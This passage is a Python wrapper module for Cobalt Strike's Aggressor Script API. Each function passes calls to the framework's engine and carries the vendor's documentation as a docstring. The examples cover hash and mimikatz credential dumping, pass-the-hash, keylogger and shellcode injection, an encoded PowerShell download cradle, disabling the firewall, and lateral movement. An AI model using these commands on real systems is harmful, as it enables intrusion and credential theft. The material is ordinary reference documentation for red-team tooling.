        Locally host a previously imported PowerShell script within Beacon and return a short script that will download and invoke this script.
        Arguments
        $1 - the id of the Beacon to host this script with.
        Returns
        A short PowerShell script to download and evaluate the previously script when run. How this one-liner is used is up to you!
        Example
        alias powershell {
            local('$args $cradle $runme $cmd');

            # $0 is the entire command with no parsing.
            $args   = substr($0, 11);

            # generate the download cradle (if one exists) for an imported PowerShell script
            $cradle = beacon_host_imported_script($1);

            # encode our download cradle AND cmdlet+args we want to run
            $runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );

            # Build up our entire command line.
            $cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";

            # task Beacon to run all of this.
            btask($1, "Tasked beacon to run: $args", "T1086");
            beacon_execute_job($1, "powershell", $cmd, 1);
        }

    """

    return engine.call('beacon_host_imported_script', args, fork=fork, sync=sync)


def beacon_host_script(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Locally host a PowerShell script within Beacon and return a short script that will download and invoke this script. This function is a way to run large scripts when there are constraints on the length of your PowerShell one-liner.
        Arguments
        $1 - the id of the Beacon to host this script with.
        $2 - the script data to host.
        Returns
        A short PowerShell script to download and evaluate the script when run. How this one-liner is used is up to you!
        Example
        alias test {
            local('$script $hosted');
            $script = "2 + 2";
            $hosted = beacon_host_script($1, $script);

            binput($1, "powerpick $hosted");
            bpowerpick($1, $hosted);
        }

    """

    return engine.call('beacon_host_script', args, fork=fork, sync=sync)


def beacon_ids(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get the ID of all Beacons calling back to this Cobalt Strike team server.
        Returns
        An array of beacon IDs
        Example
        foreach $bid (beacon_ids()) {
            println("Bid: $bid");
        }

    """

    return engine.call('beacon_ids', args, fork=fork, sync=sync)


def beacon_info(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get information from a Beacon session's metadata.
        Arguments
        $1 - the id for the beacon to pull metadata for
        $2 - the key to extract
        Returns
        A string with the requested information.
        Example
        println("User is: " . beacon_info("1234", "user"));
        println("PID  is: " . beacon_info("1234", "pid"));

    """

    return engine.call('beacon_info', args, fork=fork, sync=sync)


def beacon_inline_execute(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Execute a Beacon Object File
        Arguments
        $1 - the id for the Beacon
        $2 - a string containing the BOF file
        $3 - the entry point to call
        $4 - packed arguments to pass to the BOF file
        Notes
        The Cobalt Strike documentation has a page specific to BOF files:
        https://www.cobaltstrike.com/help-beacon-object-files
        Example (hello.c)
        /*
         * Compile with:
         * x86_64-w64-mingw32-gcc -c hello.c -o hello.x64.o
         * i686-w64-mingw32-gcc -c hello.c -o hello.x86.o
         */

        #include
        #include
        #include
        #include "beacon.h"

        void demo(char * args, int length) {
            datap  parser;
            char * str_arg;
            int    num_arg;

            BeaconDataParse(&parser, args, length);
            str_arg = BeaconDataExtract(&parser, NULL);
            num_arg = BeaconDataInt(&parser);

            BeaconPrintf(CALLBACK_OUTPUT, "Message is %s with %d arg", str_arg, num_arg);
        }

        Example (hello.cna)
        alias hello {
            local('$barch $handle $data $args');

            # figure out the arch of this session
            $barch  = barch($1);

            # read in the right BOF file
            $handle = openf(script_resource("hello. $+ $barch $+ .o"));
            $data   = readb($handle, -1);
            closef($handle);

            # pack our arguments
            $args   = bof_pack($1, "zi", "Hello World", 1234);

            # announce what we're doing
            btask($1, "Running Hello BOF");

            # execute it.
            beacon_inline_execute($1, $data, "demo", $args);
        }

        See Also
        &bof_pack

    """

    return engine.call('beacon_inline_execute', args, fork=fork, sync=sync)


def beacon_link(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        This function links to an SMB or TCP listener. If the specified listener is not an SMB or TCP listener, this function does nothing.
        Arguments
        $1 - the id of the beacon to link through
        $2 - the target host to link to. Use $null for localhost.
        $3 - the listener to link
        Example
        # smartlink [target] [listener name]
        alias smartlink {
            beacon_link($1, $2, $3);
        }

    """

    return engine.call('beacon_link', args, fork=fork, sync=sync)


def beacon_remote_exec_method_describe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Describe a Beacon remote execute method
        Returns
        A string description of the Beacon remote execute method.
        Arguments
        $1 - the method
        Example
        println(beacon_remote_exec_method_describe("wmi"));

        See Also
        &beacon_remote_exec_method_register, &beacon_remote_exec_methods, &bremote_exec

    """

    return engine.call('beacon_remote_exec_method_describe', args, fork=fork, sync=sync)


def beacon_remote_exec_method_register(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Register a Beacon remote execute method with Cobalt Strike. This adds an option for use with the remote-exec command.
        Arguments
        $1 - the method short name
        $2 - a description of the method
        $3 - the function that implements the exploit ($1 is the Beacon ID, $2 is the target, $3 is the command+args)
        See Also
        &beacon_remote_exec_method_describe, &beacon_remote_exec_methods, &bremote_exec

    """

    return engine.call('beacon_remote_exec_method_register', args, fork=fork, sync=sync)


def beacon_remote_exec_methods(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get a list of remote execute methods registered with Cobalt Strike.
        Returns
        An array of remote exec modules.
        Example
        printAll(beacon_remote_exec_methods());

        See also
        &beacon_remote_exec_method_describe, &beacon_remote_exec_method_register, &bremote_exec

    """

    return engine.call('beacon_remote_exec_methods', args, fork=fork, sync=sync)


def beacon_remote_exploit_arch(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get the arch info for this Beacon lateral movement option.
        Arguments
        $1 - the exploit
        Returns
        x86 or x64
        Example
        println(beacon_remote_exploit_arch("psexec"));

        See Also
        &beacon_remote_exploit_register, &beacon_remote_exploits, &bjump
    """

    return engine.call('beacon_remote_exploit_arch', args, fork=fork, sync=sync)


def beacon_remote_exploit_describe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Describe a Beacon lateral movement option.
        Returns
        A string description of the Beacon lateral movement option.
        Arguments
        $1 - the exploit
        Example
        println(beacon_remote_exploit_describe("psexec"));

        See Also
        &beacon_remote_exploit_register, &beacon_remote_exploits, &bjump

    """

    return engine.call('beacon_remote_exploit_describe', args, fork=fork, sync=sync)


def beacon_remote_exploit_register(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Register a Beacon lateral movement option with Cobalt Strike. This function extends the jump command.
        Arguments
        $1 - the exploit short name
        $2 - the arch associated with this attack (e.g., x86, x64)
        $3 - a description of the exploit
        $4 - the function that implements the exploit ($1 is the Beacon ID, $2 is the target, $3 is the listener)
        See Also
        &beacon_remote_exploit_describe, &beacon_remote_exploits, &bjump

    """

    return engine.call('beacon_remote_exploit_register', args, fork=fork, sync=sync)


def beacon_remote_exploits(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get a list of lateral movement options registered with Cobalt Strike.
        Returns
        An array of lateral movement option names.
        Example
        printAll(beacon_remote_exploits());

        See also
        &beacon_remote_exploit_describe, &beacon_remote_exploit_register, &bjump

    """

    return engine.call('beacon_remote_exploits', args, fork=fork, sync=sync)


def beacon_remove(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Remove a Beacon from the display.
        Arguments
        $1 - the id for the beacon to remove
    """

    return engine.call('beacon_remove', args, fork=fork, sync=sync)


def beacon_stage_pipe(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        This function handles the staging process for a bind pipe stager. This is an optional stager for lateral movement. You can stage any x86 payload/listener through this stager. Use &stager_bind_pipe to generate this stager.
        Arguments
        $1 - the id of the beacon to stage through
        $2 - the target host
        $3 - the listener name
        $4 - the architecture of the payload to stage. x86 is the only option right now.
        Example
        # step 1. generate our stager
        $stager = stager_bind_pipe("my listener");

        # step 2. do something to run our stager

        # step 3. stage a payload via this stager
        beacon_stage_pipe($bid, $target, "my listener", "x86");

        # step 4. assume control of the payload (if needed)
        beacon_link($bid, $target, "my listener");

    """

    return engine.call('beacon_stage_pipe', args, fork=fork, sync=sync)


def beacon_stage_tcp(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        This function handles the staging process for a bind TCP stager. This is the preferred stager for localhost-only staging. You can stage any payload/listener through this stager. Use &stager_bind_tcp to generate this stager.
        Arguments
        $1 - the id of the beacon to stage through
        $2 - reserved; use $null for now.
        $3 - the port to stage to
        $4 - the listener name
        $5 - the architecture of the payload to stage (x86, x64)
        Example
        # step 1. generate our stager
        $stager = stager_bind_tcp("my listener", "x86", 1234);

        # step 2. do something to run our stager

        # step 3. stage a payload via this stager
        beacon_stage_tcp($bid, $target, 1234, "my listener", "x86");

        # step 4. assume control of the payload (if needed)
        beacon_link($bid, $target, "my listener");

    """

    return engine.call('beacon_stage_tcp', args, fork=fork, sync=sync)


def beacons(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get information about all Beacons calling back to this Cobalt Strike team server.
        Returns
        An array of dictionary objects with information about each beacon.
        Example
        foreach $beacon (beacons()) {
            println("Bid: " . $beacon['id'] . " is " . $beacon['name']);
        }

    """

    return engine.call('beacons', args, fork=fork, sync=sync)


def belevate(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to spawn an elevated session with a registered technique.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the exploit to fire
        $3 - the listener to target.
        Example
        item "&Elevate 31337" {
            openPayloadHelper(lambda({
                binput($bids, "elevate ms14-058 $1");
                belevate($bids, "ms14-058", $1);
            }, $bids => $1));
        }

        See Also
        &beacon_exploit_describe, &beacon_exploit_register, &beacon_exploits

    """

    return engine.call('belevate', args, fork=fork, sync=sync)


def belevate_command(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a command in a high-integrity context
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the module/command elevator to use
        $3 - the command and its arguments.
        Example
        # disable the firewall
        alias shieldsdn {
            belevate_command($1, "uac-token-duplication", "cmd.exe /C netsh advfirewall set allprofiles state off");
        }

        See Also
        &beacon_elevator_describe, &beacon_elevator_register, &beacon_elevators
    """

    return engine.call('belevate_command', args, fork=fork, sync=sync)


def berror(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Publish an error message to the Beacon transcript
        Arguments
        $1 - the id for the beacon to post to
        $2 - the text to post
        Example
        alias donotrun {
            berror($1, "You should never run this command!");
        }

    """

    return engine.call('berror', args, fork=fork, sync=sync)


def bexecute(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to execute a command [without a shell]. This provides no output to the user.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command and arguments to run
        Example
        bexecute($1, "notepad.exe");

    """

    return engine.call('bexecute', args, silent=silent, fork=fork, sync=sync)


def bexecute_assembly(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Spawns a local .NET executable assembly as a Beacon post-exploitation job.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the local path to the .NET executable assembly
        $3 - parameters to pass to the assembly
        Notes

        This command accepts a valid .NET executable and calls its entry point.
        This post-exploitation job (like others) runs with the primary token of your Beacon process. It does not inherit Beacon's thread token.
        Compile your custom .NET programs with a .NET 3.5 compiler for compatability with systems that don't have .NET 4.0 and later.

        Example
        alias myutil {
            bexecute_assembly($1, script_resource("myutil.exe"), "arg1 arg2 \"arg 3\"");
        }

    """

    return engine.call('bexecute_assembly', args, silent=silent, fork=fork, sync=sync)


def bexit(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask a Beacon to exit.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        item "&Die" {
            binput($1, "exit");
            bexit($1);
        }

    """

    return engine.call('bexit', args, fork=fork, sync=sync)


def bgetprivs(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Attempts to enable the specified privilege in your Beacon session.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - a comma-separated list of privileges to enable. See:
        https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx
        Example
        alias debug {
            bgetprivs($1, "SeDebugPriv");
        }

    """

    return engine.call('bgetprivs', args, fork=fork, sync=sync)


def bgetsystem(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to attempt to get the SYSTEM token.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        item "Get &SYSTEM" {
            binput($1, "getsystem");
            bgetsystem($1);
        }

    """

    return engine.call('bgetsystem', args, fork=fork, sync=sync)


def bgetuid(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to print the User ID of the current token
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        bgetuid($1);

    """

    return engine.call('bgetuid', args, fork=fork, sync=sync)


def bhashdump(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to dump local account password hashes.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        item "Dump &Hashes" {
            binput($1, "hashdump");
            bhashdump($1);
        }

    """

    return engine.call('bhashdump', args, silent=silent, fork=fork, sync=sync)


def bind(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Bind a keyboard shortcut to an Aggressor Script function. This is an alternate to the bind keyword.
        Arguments
        $1 - the keyboard shortcut
        $2 - a callback function. Called when the event happens.
        Example
        # bind Ctrl+Left and Ctrl+Right to cycle through previous and next tab.

        bind("Ctrl+Left", {
            previousTab();
        });

        bind("Ctrl+Right", {
            nextTab();
        });

        See Also
        &unbind

    """

    return engine.call('bind', args, fork=fork, sync=sync)


def binfo(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Get information from a Beacon session's metadata.
        Arguments
        $1 - the id for the beacon to pull metadata for
        $2 - the key to extract
        Returns
        A string with the requested information.
        Example
        println("User is: " . binfo("1234", "user"));
        println("PID  is: " . binfo("1234", "pid"));

    """

    return engine.call('binfo', args, fork=fork, sync=sync)


def binject(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to inject a session into a specific process
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the process to inject the session into
        $3 - the listener to target.
        $4 - the process architecture (x86 | x64)
        Example
        binject($1, 1234, "my listener");

    """

    return engine.call('binject', args, fork=fork, sync=sync)


def binjectsh(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Inject shellcode into a process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to inject
        $3 - x86|x64 - the architecture of the target process
        $3 - the local path to the file containing the shellcode.
        Example
        binjectsh($1, 1234, "x86", script_resource("test.bin"));

    """

    return engine.call('binjectsh', args, fork=fork, sync=sync)


def binline_execute(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Execute a Beacon Object File. This is the same as using the inline-execute command in Beacon.
        Arguments
        $1 - the id for the Beacon
        $2 - the path to the BOF file
        $3 - the string argument to pass to the BOF file
        Notes
        This functions follows the behavior of *inline-execute* in the Beacon console. The string argument will be zero-terminated, converted to the target encoding, and passed as an argument to the BOF's go function. To execute a BOF, with more control, use &beacon_inline_execute
        The Cobalt Strike documentation has a page specific to BOF files:
        https://www.cobaltstrike.com/help-beacon-object-files

    """

    return engine.call('binline_execute', args, fork=fork, sync=sync)


def binput(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Report a command was run to the Beacon console and logs. Scripts that execute commands for the user (e.g., events, popup menus) should use this function to assure operator attribution of automated actions in Beacon's logs.
        Arguments
        $1 - the id for the beacon to post to
        $2 - the text to post
        Example
        # indicate the user ran the ls command
        binput($1, "ls");

    """

    return engine.call('binput', args, fork=fork, sync=sync)


def bipconfig(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Task a Beacon to list network interfaces.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - callback function with the ipconfig results. Arguments to the callback are: $1 = beacon ID, $2 = results
        Example
        alias ipconfig {
            bipconfig($1, {
                blog($1, "Network information is:\n $+ $2");
            });
        }

    """

    return engine.call('bipconfig', args, fork=fork, sync=sync)


def bjobkill(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to kill a running post-exploitation job
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the job ID.
        Example
        bjobkill($1, 0);

    """

    return engine.call('bjobkill', args, fork=fork, sync=sync)


def bjobs(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to list running post-exploitation jobs.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        bjobs($1);

    """

    return engine.call('bjobs', args, silent=silent, fork=fork, sync=sync)


def bjump(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to spawn a session on a remote target.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the technique to use
        $3 - the remote target
        $4 - the listener to spawn
        Example
        # winrm [target] [listener]
        alias winrm {
            bjump($1, "winrm", $2, $3); {
        }

        See Also
        &beacon_remote_exploit_describe, &beacon_remote_exploit_register, &beacon_remote_exploits
    """

    return engine.call('bjump', args, fork=fork, sync=sync)


def bkerberos_ccache_use(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask beacon to inject a UNIX kerberos ccache file into the user's kerberos tray
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the local path the ccache file
        Example
        alias kerberos_ccache_use {
            bkerberos_ccache_use($1, $2);
        }

    """

    return engine.call('bkerberos_ccache_use', args, fork=fork, sync=sync)


def bkerberos_ticket_purge(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask beacon to purge tickets from the user's kerberos tray
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        alias kerberos_ticket_purge {
            bkerberos_ticket_purge($1);
        }

    """

    return engine.call('bkerberos_ticket_purge', args, fork=fork, sync=sync)


def bkerberos_ticket_use(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask beacon to inject a mimikatz kirbi file into the user's kerberos tray
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the local path the kirbi file
        Example
        alias kerberos_ticket_use {
            bkerberos_ticket_use($1, $2);
        }

    """

    return engine.call('bkerberos_ticket_use', args, fork=fork, sync=sync)


def bkeylogger(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Injects a keystroke logger into a process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to inject the keystroke logger into.
        $3 - the architecture of the target PID (x86|x64)
        Example
        bkeylogger($1, 1234, "x64");

    """

    return engine.call('bkeylogger', args, silent=silent, fork=fork, sync=sync)


def bkill(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to kill a process
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to kill
        Example
        bkill($1, 1234);

    """

    return engine.call('bkill', args, silent=silent, fork=fork, sync=sync)


def blink(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to link to a host over a named pipe
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to link to
        $3 - [optional] the pipename to use. The default pipename in the Malleable C2 profile is the default otherwise.
        Note
        Use &beacon_link if you want a script function that will connect or link based on a listener configuration.
        Example
        blink($1, "DC");

    """

    return engine.call('blink', args, fork=fork, sync=sync)


def blog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Post a message to WordPress.com (just kidding). Publishes an output message to the Beacon transcript.
        Arguments
        $1 - the id for the beacon to post to
        $2 - the text to post
        Example
        alias demo {
            blog($1, "I am output for the blog function");
        }

    """

    return engine.call('blog', args, fork=fork, sync=sync)


def blog2(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Publishes an output message to the Beacon transcript. This function has an alternate format from &blog
        Arguments
        $1 - the id for the beacon to post to
        $2 - the text to post
        Example
        alias demo2 {
            blog2($1, "I am output for the blog2 function");
        }

    """

    return engine.call('blog2', args, fork=fork, sync=sync)


def bloginuser(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to create a token from the specified credentials. This is the make_token command.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the domain of the user
        $3 - the user's username
        $4 - the user's password
        Example
        # make a token for a user with an empty password
        alias make_token_empty {
            local('$domain $user');
            ($domain, $user) = split("\\\\", $2);]
            bloginuser($1, $domain, $user, "");
        }

    """

    return engine.call('bloginuser', args, fork=fork, sync=sync)


def blogonpasswords(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to dump in-memory credentials with mimikatz
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        item "Dump &Passwords" {
            binput($1, "logonpasswords");
            blogonpasswords($1);
        }

    """

    return engine.call('blogonpasswords', args, silent=silent, fork=fork, sync=sync)


def bls(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Task a Beacon to list files
        Variations
        bls($1, "folder");

        Output the results to the Beacon console.
        bls($1, "folder", &callback);

        Route results to the specified callback function.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the folder to list files for. Use . for the current folder.
        $3 - an optional callback function with the ps results. Arguments to the callback are: $1 = beacon ID, $2 = the folder, $3 = results
        Example
        on beacon_initial {
            bls($1, ".");
        }

    """

    return engine.call('bls', args, fork=fork, sync=sync)


def bmimikatz(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a mimikatz command.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command and arguments to run
        Example
        alias coffee {
            bmimikatz($1, "standard::coffee");
        }

    """

    return engine.call('bmimikatz', args, fork=fork, sync=sync)


def bmimikatz_small(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Use Cobalt Strike's "smaller" internal build of Mimikatz to execute a mimikatz command.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command and arguments to run
        Notes
        This mimikatz build supports:
        * kerberos::golden
        * lsadump::dcsync
        * sekurlsa::logonpasswords
        * sekurlsa::pth

        All of the other stuff is removed for size. Use &bmimikatz if you want to bring the full ULTIMATE power of mimikatz to bare on some other offense problem.
        Example
        alias coffee {
            bmimikatz_small($1, "!sekurlsa::logonpasswords");
        }

    """

    return engine.call('bmimikatz_small', args, fork=fork, sync=sync)


def bmkdir(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to make a directory
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the folder to create
        Example
        bmkdir($1, "you are owned");

    """

    return engine.call('bmkdir', args, silent=silent, fork=fork, sync=sync)


def bmode(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Change the data channel for a DNS Beacon.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the data channel (e.g., dns, dns6, or dns-txt)
        Example
        item "Mode DNS-TXT" {
            binput($1, "mode dns-txt");
            bmode($1, "dns-txt");
        }

    """

    return engine.call('bmode', args, fork=fork, sync=sync)


def bmv(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to move a file or folder.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file or folder to move
        $3 - the destination
        Example
        bmv($1, "evil.exe", "\\\\target\\\C$\\evil.exe");

    """

    return engine.call('bmv', args, fork=fork, sync=sync)


def bnet(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Run a command from Beacon's net module.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command to run.


        Type
        Description


        computers
        lists hosts in a domain (groups)


        dclist
        lists domain controllers


        domain
        show the current domain


        domain_controllers
        list domain controller hosts in a domain (groups)


        domain_trusts
        lists domain trusts


        group
        lists groups and users in groups


        localgroup
        lists local groups and users in local groups


        logons
        lists users logged onto a host


        sessions
        lists sessions on a host


        share
        lists shares on a host


        user
        lists users and user information


        time
        show time for a host


        view
        lists hosts in a domain (browser service)


        $3 - the target to run this command against or $null
        $4 - the parameter to this command (e.g., a group name)
        Example
        # ladmins [target]
        #   find the local admins for a target
        alias ladmins {
            bnet($1, "localgroup", $2, "administrators");
        }

    """

    return engine.call('bnet', args, silent=silent, fork=fork, sync=sync)


def bnote(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Assign a note to the specified Beacon.
        Arguments
        $1 - the id for the beacon to post to
        $2 - the note content
        Example
        bnote($1, "foo");

    """

    return engine.call('bnote', args, fork=fork, sync=sync)


def bof_pack(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Pack arguments in a way that's suitable for BOF APIs to unpack.
        Arguments
        $1 - the id for the Beacon (needed for unicode conversions)
        $2 - format string for the packed data
        ... - one argument per item in our format string
        Notes
        This function packs its arguments into a binary structure for use with &beacon_inline_execute. The format string options here correspond to the BeaconData* C API available to BOF files. This API handles transformations on the data and hints as required by each type it can pack.


        Type
        Description
        Unpack With (C)


        b
        binary data
        BeaconDataExtract


        i
        4-byte integer
        BeaconDataInt


        s
        2-byte short integer
        BeaconDataShort


        z
        zero-terminated+encoded string
        BeaconDataExtract


        Z
        zero-terminated wide-char string
        (wchar_t *)BeaconDataExtract


        The Cobalt Strike documentation has a page specific to BOF files:
        https://www.cobaltstrike.com/help-beacon-object-files
        See Also
        &beacon_inline_execute

    """

    return engine.call('bof_pack', args, fork=fork, sync=sync)


def bpassthehash(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the domain of the user
        $3 - the user's username
        $4 - the user's password hash
        Example
        bpassthehash($1, "GLITTER", "Administrator", $hash);

    """

    return engine.call('bpassthehash', args, fork=fork, sync=sync)


def bpause(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to pause its execution. This is a one-off sleep.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - how long the Beacon should pause execution for (milliseconds)
        Example
        alias pause {
            bpause($1, int($2));
        }

    """

    return engine.call('bpause', args, fork=fork, sync=sync)


def bportscan(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run its port scanner.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the targets to scan (e.g., 192.168.12.0/24)
        $3 - the ports to scan (e.g., 1-1024,6667)
        $4 - the discovery method to use (arp|icmp|none)
        $5 - the max number of sockets to use (e.g., 1024)
        Example
        bportscan($1, "192.168.12.0/24", "1-1024,6667", "arp", 1024);

    """

    return engine.call('bportscan', args, fork=fork, sync=sync)


def bpowerpick(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Spawn a process, inject Unmanaged PowerShell, and run the specified command.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the cmdlet and arguments
        $3 - [optional] if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command. Empty string is OK here too, for no download cradle.
        Example
        # get the version of PowerShell available via Unmanaged PowerShell
        alias powerver {
            bpowerpick($1, '$PSVersionTable.PSVersion');
        }

    """

    return engine.call('bpowerpick', args, silent=silent, fork=fork, sync=sync)


def bpowershell(*args, silent=False, fork=None, sync=True):
    r""""
